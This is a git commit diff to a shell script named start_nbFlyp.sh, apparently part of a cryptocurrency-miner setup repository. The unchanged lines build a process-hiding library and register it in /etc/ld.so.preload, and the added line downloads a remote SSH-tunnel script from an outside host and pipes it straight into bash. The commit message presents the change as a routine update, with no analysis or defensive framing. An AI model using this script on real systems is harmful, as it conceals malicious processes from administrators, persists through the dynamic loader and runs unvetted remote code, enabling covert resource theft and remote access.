6d4af89e79a5be17f30f9e6dc043fa24b43ce7eb
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-02-04 14:11:17 +0200

    Update start_nbFlyp.sh

--- start_nbFlyp.sh
+++ start_nbFlyp.sh
@@ -12,4 +12,5 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
 ./nbFlyp.sh
